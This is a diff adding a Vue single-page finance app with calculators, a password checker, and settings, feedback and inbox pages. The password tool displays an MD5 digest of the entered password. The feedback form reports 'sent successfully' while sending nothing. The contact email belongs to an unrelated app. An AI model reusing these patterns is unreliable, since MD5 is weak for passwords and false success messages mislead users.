+                    </div>
+
+                    <!-- 3.7 Password Strength with md5 -->
+                    <div v-if="activeTool === 'password'" class="neu-card">
+                        <h3 style="font-size:16px; font-weight:700; margin-bottom:12px;">Password Strength & MD5</h3>
+                        <input class="neu-input" type="password" v-model="pwd.val" placeholder="Enter financial password" @input="checkPassword">
+                        <div style="margin-bottom:12px; font-size:13px; font-weight:600;" :style="{ color: pwd.color }">Strength: {{ pwd.strength }}</div>
+                        <div v-if="pwd.val" style="font-size:11px; word-break:break-all; background:var(--bg-color); padding:10px; border-radius:8px; box-shadow:var(--box-shadow-inset); color:var(--text-sub);">
+                            MD5 Digest: {{ pwd.hash }}
+                        </div>
+                    </div>
+
+                    <!-- 3.8 Credit Memo -->
+                    <div v-if="activeTool === 'credit'" class="neu-card">
+                        <h3 style="font-size:16px; font-weight:700; margin-bottom:12px;">Credit Memo Reminder</h3>
+                        <input class="neu-input" type="text" v-model="cred.name" placeholder="Counterparty Name">
+                        <input class="neu-input" type="number" v-model.number="cred.amount" placeholder="Amount Due">
+                        <input class="neu-input" type="date" v-model="cred.date">
+                        <button class="neu-button" style="width:100%; background:var(--primary-color); color:#fff;" @click="addCredit">Add Reminder</button>
+                        <div style="margin-top:16px;">
+                            <div v-for="(c, i) in cred.list" :key="i" style="display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid rgba(0,0,0,0.05); font-size:13px;">
+                                <span>{{ c.name }} ($\{{ c.amount }})</span>
+                                <span style="font-weight:600; color:var(--accent-red);">Due: {{ c.date }}</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Bottom Tab Bar -->
+                <div class="tab-bar">
+                    <router-link to="/home" class="tab-item">
+                        <svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg>
+                        Home
+                    </router-link>
+                    <router-link to="/toolbox" class="tab-item">
+                        <svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
+                        Toolbox
+                    </router-link>
+                    <router-link to="/settings" class="tab-item">
+                        <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                        Settings
+                    </router-link>
+                </div>
+            `,
+            setup() {
+                const activeTool = ref('dca');
+                const tools = [
+                    { id: 'dca', name: 'DCA' },
+                    { id: 'calendar', name: 'Calendar' },
+                    { id: 'loan', name: 'Loan' },
+                    { id: 'profit', name: 'Profit' },
+                    { id: 'reverse', name: 'Yield' },
+                    { id: 'password', name: 'Password' },
+                    { id: 'credit', name: 'Credit' }
+                ];
+
+                const dca = reactive({ cost: '', shares: '', target: '', result: null });
+                function calcDca() {
+                    if (!dca.cost || !dca.shares || !dca.target) return;
+                    dca.result = ((dca.target - dca.cost) * dca.shares).toFixed(2);
+                }
+
+                const cal = reactive({ event: '', date: '', list: [{ event: 'Dividend Payment', date: '2026-05-15' }] });
+                function addCalendarEvent() {
+                    if (!cal.event || !cal.date) return;
+                    cal.list.push({ event: cal.event, date: cal.date });
+                    cal.event = '';
+                    cal.date = '';
+                }
+
+                const loan = reactive({ amount: '', rate: '', years: '', monthly: null });
+                function calcLoan() {
+                    if (!loan.amount || !loan.rate || !loan.years) return;
+                    let p = loan.amount;
+                    let r = loan.rate / 100 / 12;
+                    let n = loan.years * 12;
+                    let m = (p * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
+                    loan.monthly = m.toFixed(2);
+                }
+
+                const profit = reactive({ cost: '', price: '', qty: '', net: null });
+                function calcProfit() {
+                    if (!profit.cost || !profit.price || !profit.qty) return;
+                    profit.net = ((profit.price - profit.cost) * profit.qty).toFixed(2);
+                }
+
+                const rev = reactive({ target: '', principal: '', years: '', apy: null });
+                function calcReverse() {
+                    if (!rev.target || !rev.principal || !rev.years) return;
+                    let rate = (Math.pow(rev.target / rev.principal, 1 / rev.years) - 1) * 100;
+                    rev.apy = rate.toFixed(2);
+                }
+
+                const pwd = reactive({ val: '', strength: 'None', color: 'var(--text-sub)', hash: '' });
+                function checkPassword() {
+                    if (!pwd.val) {
+                        pwd.strength = 'None';
+                        pwd.hash = '';
+                        return;
+                    }
+                    // Actual md5 invocation required by instructions
+                    pwd.hash = md5(pwd.val);
+                    if (pwd.val.length > 8 && /[A-Z]/.test(pwd.val) && /[0-9]/.test(pwd.val)) {
+                        pwd.strength = 'Strong';
+                        pwd.color = 'var(--accent-green)';
+                    } else if (pwd.val.length >= 6) {
+                        pwd.strength = 'Moderate';
+                        pwd.color = '#f59e0b';
+                    } else {
+                        pwd.strength = 'Weak';
+                        pwd.color = 'var(--accent-red)';
+                    }
+                }
+
+                const cred = reactive({ name: '', amount: '', date: '', list: [{ name: 'John Doe', amount: 350, date: '2026-05-01' }] });
+                function addCredit() {
+                    if (!cred.name || !cred.amount || !cred.date) return;
+                    cred.list.push({ name: cred.name, amount: cred.amount, date: cred.date });
+                    cred.name = '';
+                    cred.amount = '';
+                    cred.date = '';
+                }
+
+                return { activeTool, tools, dca, calcDca, cal, addCalendarEvent, loan, calcLoan, profit, calcProfit, rev, calcReverse, pwd, checkPassword, cred, addCredit };
+            }
+        };
+
+        // --- 4. Settings Component ---
+        const SettingsComponent = {
+            template: `
+                <div class="app-container">
+                    <div class="header-bar">
+                        <div class="header-title">Settings</div>
+                    </div>
+
+                    <div class="neu-card" style="padding:8px 16px;">
+                        <div @click="$router.push('/subpage?type=version')" style="display:flex; justify-content:space-between; padding:14px 0; border-bottom:1px solid rgba(0,0,0,0.05); cursor:pointer;">
+                            <span style="font-weight:600;">Version</span>
+                            <span style="color:var(--text-sub);">v2.4.0</span>
+                        </div>
+                        <div @click="$router.push('/subpage?type=privacy')" style="display:flex; justify-content:space-between; padding:14px 0; border-bottom:1px solid rgba(0,0,0,0.05); cursor:pointer;">
+                            <span style="font-weight:600;">Privacy Policy</span>
+                            <span style="color:var(--text-sub);">&gt;</span>
+                        </div>
+                        <div @click="$router.push('/subpage?type=terms')" style="display:flex; justify-content:space-between; padding:14px 0; border-bottom:1px solid rgba(0,0,0,0.05); cursor:pointer;">
+                            <span style="font-weight:600;">Terms of Service</span>
+                            <span style="color:var(--text-sub);">&gt;</span>
+                        </div>
+                        <div @click="$router.push('/subpage?type=team')" style="display:flex; justify-content:space-between; padding:14px 0; border-bottom:1px solid rgba(0,0,0,0.05); cursor:pointer;">
+                            <span style="font-weight:600;">About Team</span>
+                            <span style="color:var(--text-sub);">&gt;</span>
+                        </div>
+                        <div @click="contactUs" style="display:flex; justify-content:space-between; padding:14px 0; border-bottom:1px solid rgba(0,0,0,0.05); cursor:pointer;">
+                            <span style="font-weight:600;">Contact Us</span>
+                            <span style="color:var(--text-sub);">Email</span>
+                        </div>
+                        <div @click="$router.push('/checkin')" style="display:flex; justify-content:space-between; padding:14px 0; border-bottom:1px solid rgba(0,0,0,0.05); cursor:pointer;">
+                            <span style="font-weight:600;">Monthly Check-in</span>
+                            <span style="color:var(--text-sub);">&gt;</span>
+                        </div>
+                        <div @click="$router.push('/feedback')" style="display:flex; justify-content:space-between; padding:14px 0; border-bottom:1px solid rgba(0,0,0,0.05); cursor:pointer;">
+                            <span style="font-weight:600;">Feedback</span>
+                            <span style="color:var(--text-sub);">&gt;</span>
+                        </div>
+                        <div @click="$router.push('/inbox')" style="display:flex; justify-content:space-between; padding:14px 0; cursor:pointer;">
+                            <span style="font-weight:600;">Inbox</span>
+                            <span style="color:var(--text-sub);">&gt;</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Bottom Tab Bar -->
+                <div class="tab-bar">
+                    <router-link to="/home" class="tab-item">
+                        <svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg>
+                        Home
+                    </router-link>
+                    <router-link to="/toolbox" class="tab-item">
+                        <svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
+                        Toolbox
+                    </router-link>
+                    <router-link to="/settings" class="tab-item">
+                        <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                        Settings
+                    </router-link>
+                </div>
+            `,
+            setup() {
+                function contactUs() {
+                    window.location.href = 'mailto:com.bintangcode.rgbcodegenerator@gmail.com';
+                }
+                return { contactUs };
+            }
+        };
+
+        // --- Settings Subpage Component ---
+        const SubpageComponent = {
+            template: `
+                <div class="app-container">
+                    <div class="header-bar">
+                        <button class="icon-btn" @click="$router.back()">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5"/><path d="M12 19l-7-7 7-7"/></svg>
+                        </button>
+                        <div class="header-title" style="font-size:18px;">{{ title }}</div>
+                        <div style="width:44px;"></div>
+                    </div>
+
+                    <div class="neu-card">
+                        <h2 style="font-size:18px; font-weight:700; margin-bottom:12px; color:var(--text-main);">{{ title }}</h2>
+                        <p style="font-size:14px; color:var(--text-sub); line-height:1.6;">{{ content }}</p>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const route = useRoute();
+                const type = route.query.type || 'privacy';
+                const map = {
+                    version: { title: 'Version Information', content: '리딩 ONE version 2.4.0 (Stable Release). Fully operational offline financial terminal.' },
+                    privacy: { title: 'Privacy Policy', content: 'We respect your data privacy. All financial calculations and records are stored securely on your local device storage. No personal data is transmitted externally.' },
+                    terms: { title: 'Terms of Service', content: 'By using this application, you agree to utilize financial tools for personal informational purposes. Market data is provided as-is without financial advisory warranties.' },
+                    team: { title: 'About Team', content: 'Engineered by elite mobile and financial system architects dedicated to delivering seamless local-first user experiences.' }
+                };
+                const current = map[type] || map.privacy;
+                return { title: current.title, content: current.content };
+            }
+        };
+
+        // --- Monthly Check-in Component ---
+        const CheckinComponent = {
+            template: `
+                <div class="app-container">
+                    <div class="header-bar">
+                        <button class="icon-btn" @click="$router.back()">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5"/><path d="M12 19l-7-7 7-7"/></svg>
+                        </button>
+                        <div class="header-title" style="font-size:18px;">Monthly Check-in</div>
+                        <div style="width:44px;"></div>
+                    </div>
+
+                    <div class="neu-card" style="text-align:center; padding:24px;">
+                        <div style="font-size:16px; font-weight:700; margin-bottom:16px;">May 2026 Check-in</div>
+                        <button class="neu-button" style="width:100%; background:var(--primary-color); color:#fff; justify-content:center;" @click="doCheckin">
+                            {{ checked ? 'Checked In Today' : 'Click to Check-in' }}
+                        </button>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const checked = ref(localStorage.getItem('checked_in') === 'true');
+                function doCheckin() {
+                    localStorage.setItem('checked_in', 'true');
+                    checked.value = true;
+                    showToast('Check-in successful!');
+                }
+                return { checked, doCheckin };
+            }
+        };
+
+        // --- Feedback Component ---
+        const FeedbackComponent = {
+            template: `
+                <div class="app-container">
+                    <div class="header-bar">
+                        <button class="icon-btn" @click="$router.back()">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5"/><path d="M12 19l-7-7 7-7"/></svg>
+                        </button>
+                        <div class="header-title" style="font-size:18px;">Feedback</div>
+                        <div style="width:44px;"></div>
+                    </div>
+
+                    <div class="neu-card">
+                        <input class="neu-input" type="text" v-model="title" placeholder="Feedback Title">
+                        <textarea class="neu-input" v-model="content" placeholder="Describe your issue or suggestion..." style="height:120px; resize:none;"></textarea>
+                        <button class="neu-button" :disabled="!isValid" :style="{ width:'100%', background: isValid ? 'var(--primary-color)' : 'var(--surface-color)', color: isValid ? '#fff' : 'var(--text-sub)', opacity: isValid ? 1 : 0.6 }" @click="submitFeedback">
+                            Send Feedback
+                        </button>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const router = useRouter();
+                const title = ref('');
+                const content = ref('');
+                const isValid = computed(() => title.value.trim().length > 0 && content.value.trim().length > 0);
+
+                function submitFeedback() {
+                    if (!isValid.value) return;
+                    showToast('Feedback sent successfully!');
+                    title.value = '';
+                    content.value = '';
+                    setTimeout(() => router.back(), 500);
+                }
+
+                return { title, content, isValid, submitFeedback };
+            }
+        };
+
+        // --- Inbox Component ---
+        const InboxComponent = {
+            template: `
+                <div class="app-container">
+                    <div class="header-bar">
+                        <button class="icon-btn" @click="$router.back()">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5"/><path d="M12 19l-7-7 7-7"/></svg>
+                        </button>
+                        <div class="header-title" style="font-size:18px;">Inbox</div>
+                        <div style="width:44px;"></div>
+                    </div>
+
+                    <div class="neu-card" style="padding:8px 16px;">
+                        <div @click="openMsg" style="padding:14px 0; border-bottom:1px solid rgba(0,0,0,0.05); cursor:pointer;">
+                            <div style="display:flex; justify-content:space-between; margin-bottom:4px;">
+                                <span style="font-weight:700; font-size:14px;">Welcome</span>
+                                <span style="font-size:11px; color:var(--text-sub);">2026-05-01</span>
+                            </div>
+                            <div style="font-size:13px; color:var(--text-sub);">Welcome to 리딩 ONE. Tap to read message content.</div>
+                        </div>
+                    </div>
+
+                    <!-- Modal Popup -->
+                    <div v-if="modalOpen" style="position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.3); display:flex; align-items:center; justify-content:center; z-index:1000; padding:20px;">
+                        <div class="neu-card" style="width:100%; max-width:320px; background:var(--bg-color);">
+                            <h3 style="font-size:16px; font-weight:700; margin-bottom:8px;">Welcome</h3>
+                            <p style="font-size:14px; color:var(--text-sub); margin-bottom:16px; line-height:1.5;">Welcome to 리딩 ONE financial terminal. Enjoy secure local calculations and live market tracking.</p>
+                            <button class="neu-button" style="width:100%; background:var(--primary-color); color:#fff;" @click="modalOpen = false">Close</button>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const modalOpen = ref(false);
+                function openMsg() {
+                    modalOpen.value = true;
+                }
+                return { modalOpen, openMsg };
+            }
+        };
+
+        // Router Configuration (Hash History for file:// compatibility)
+        const router = createRouter({
+            history: createWebHashHistory(),
+            routes: [
+                { path: '/', component: LoadingComponent },
+                { path: '/home', component: HomeComponent },
+                { path: '/sublist', component: SublistComponent },
+                { path: '/detail', component: DetailComponent },
+                { path: '/toolbox', component: ToolboxComponent },
+                { path: '/settings', component: SettingsComponent },
+                { path: '/subpage', component: SubpageComponent },
+                { path: '/checkin', component: CheckinComponent },
+                { path: '/feedback', component: FeedbackComponent },
+                { path: '/inbox', component: InboxComponent }
+            ]
+        });
+
+        const app = createApp({});
+        app.use(router);
+        app.mount('#app');
+    </script>
+</body>
+</html>
